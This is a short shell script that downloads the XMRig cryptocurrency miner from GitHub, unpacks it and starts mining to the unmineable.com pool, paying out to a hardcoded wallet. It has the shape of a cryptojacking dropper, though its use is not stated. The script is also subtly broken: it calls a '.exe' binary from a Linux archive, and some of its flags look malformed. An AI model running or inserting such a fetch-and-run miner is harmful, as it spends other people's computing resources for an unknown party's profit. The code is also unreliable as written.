#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz

tar xf xmrig-6.15.0-linux-x64.tar.gz

cd xmrig-6.15.0

./xmrig.exe -o rx.unmineable.com:3333 -u HOT:0x9e697b0d4b3bbea30173d33e22667c945e0bfa6d.cpu -p -x -k -a rx/0 -t2



